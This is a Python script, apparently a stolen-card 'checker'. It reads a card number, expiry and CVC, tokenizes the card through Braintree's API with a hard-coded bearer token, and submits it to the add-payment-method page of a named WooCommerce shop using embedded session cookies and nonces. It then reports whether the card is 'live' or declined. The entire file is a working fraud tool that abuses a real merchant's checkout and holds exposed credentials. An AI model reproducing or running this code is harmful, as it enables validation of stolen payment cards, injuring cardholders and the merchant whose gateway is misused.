import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTczNDAxNTYsImp0aSI6IjY3NzAzODg2LTJhMGItNDM1My04ZGZhLWY4ZjI1ZDZmMzUxNSIsInN1YiI6ImpzYnFoNzdoYjNqMzVtd20iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpzYnFoNzdoYjNqMzVtd20iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.dnAhWK5G4zCc5mFffu8-rhxf_hOiE1ClXBMa1CL54Nty31xJYxweudvtLmewO3DStHs6H-yzzDuDputSzBPkNg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6d190735-92bc-4aef-960c-50d7a8a07365',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	




	cookies = {
    'plNfcwBEs': 'n%2AhpwAL',
    'IaOnbLXQEF': 'ie59O_YtU%5B.%5DmGJ',
    'm_GsFKuEePSxNV': '6_p4ihYa',
    'gYJjhOcfkBPnmNT': 'P3ZsJ7oF0evEu',
    'apbct_site_referer': 'UNKNOWN',
    'cerber_groove': '314ac00fd006d0deb73eda02bcdd88d5',
    'cerber_groove_x_vbKEqg9IT1ozVDemsx4L2d6i5tQGcl': 'IgjpAmKJNscHik8v9LeFSYhRf',
    'apbct_site_landing_ts': '1717253599',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-01%2014%3A53%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-01%2014%3A53%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'ct_timezone': '3',
    'apbct_headless': 'false',
    'ct_checkjs': '1507252014',
    'ct_has_scrolled': 'true',
    'ct_mouse_moved': 'true',
    'wordpress_test_cookie': 'WP%20Cookie%20check',
    'ct_has_input_focused': 'true',
    'ct_has_key_up': 'true',
    'wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c': 'moh5529605588vbnm%7C1718463292%7CeUAPfqbxdfrZad482EKvtT86outzjELH7Mfw6YSXIm0%7C780a424315953e2664f7e64deee12fcc391d29006e27702befbbd32e95d7776c',
    'ct_checked_emails': '0',
    'apbct_prev_referer': 'https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F',
    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F',
    'ct_ps_timestamp': '1717253754',
    'ct_screen_info': '%7B%22fullWidth%22%3A393%2C%22fullHeight%22%3A1358%2C%22visibleWidth%22%3A393%2C%22visibleHeight%22%3A801%7D',
    'ct_fkp_timestamp': '1717254360',
    'apbct_timestamp': '1717254370',
    'apbct_page_hits': '14',
    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522f426548f66b82a35d18040330f3e90c9%2522%257D',
    'apbct_urls': '%7B%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1717253699%2C1717253715%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fbilling%2F%22%3A%5B1717253702%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1717253718%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1717253722%2C1717253754%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1717254370%5D%7D',
    'ct_sfw_pass_key': '0cdb52b3e931b98daa69619fc1cad4e90',
    'ct_pointer_data': '%5B%5B4%2C41%2C606358%5D%2C%5B444%2C260%2C616365%5D%5D',
}

	headers = {
    'authority': 'www.blackorchidcouture.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'plNfcwBEs=n%2AhpwAL; IaOnbLXQEF=ie59O_YtU%5B.%5DmGJ; m_GsFKuEePSxNV=6_p4ihYa; gYJjhOcfkBPnmNT=P3ZsJ7oF0evEu; apbct_site_referer=UNKNOWN; cerber_groove=314ac00fd006d0deb73eda02bcdd88d5; cerber_groove_x_vbKEqg9IT1ozVDemsx4L2d6i5tQGcl=IgjpAmKJNscHik8v9LeFSYhRf; apbct_site_landing_ts=1717253599; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-01%2014%3A53%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-01%2014%3A53%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; ct_timezone=3; apbct_headless=false; ct_checkjs=1507252014; ct_has_scrolled=true; ct_mouse_moved=true; wordpress_test_cookie=WP%20Cookie%20check; ct_has_input_focused=true; ct_has_key_up=true; wordpress_logged_in_b11649193abc24c881cdab50e9bfa64c=moh5529605588vbnm%7C1718463292%7CeUAPfqbxdfrZad482EKvtT86outzjELH7Mfw6YSXIm0%7C780a424315953e2664f7e64deee12fcc391d29006e27702befbbd32e95d7776c; ct_checked_emails=0; apbct_prev_referer=https%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F; ct_ps_timestamp=1717253754; ct_screen_info=%7B%22fullWidth%22%3A393%2C%22fullHeight%22%3A1358%2C%22visibleWidth%22%3A393%2C%22visibleHeight%22%3A801%7D; ct_fkp_timestamp=1717254360; apbct_timestamp=1717254370; apbct_page_hits=14; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522f426548f66b82a35d18040330f3e90c9%2522%257D; apbct_urls=%7B%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2F%22%3A%5B1717253699%2C1717253715%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fedit-address%2Fbilling%2F%22%3A%5B1717253702%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1717253718%5D%2C%22www.blackorchidcouture.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1717253722%2C1717253754%5D%2C%22www.blackorchidcouture.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framewor%22%3A%5B1717254370%5D%7D; ct_sfw_pass_key=0cdb52b3e931b98daa69619fc1cad4e90; ct_pointer_data=%5B%5B4%2C41%2C606358%5D%2C%5B444%2C260%2C616365%5D%5D',
    'origin': 'https://www.blackorchidcouture.com',
    'pragma': 'no-cache',
    'referer': 'https://www.blackorchidcouture.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '{"correlation_id":"24ef6ea56a6322d9903a8cd73f44fd00"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '2b5d00705a',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
    'apbct_visible_fields': 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3b29jb21tZXJjZS1hZGQtcGF5bWVudC1tZXRob2Qtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciB3b29jb21tZXJjZV9hZGRfcGF5bWVudF9tZXRob2QiLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoxMH19',
}

	response = requests.post(
    'https://www.blackorchidcouture.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
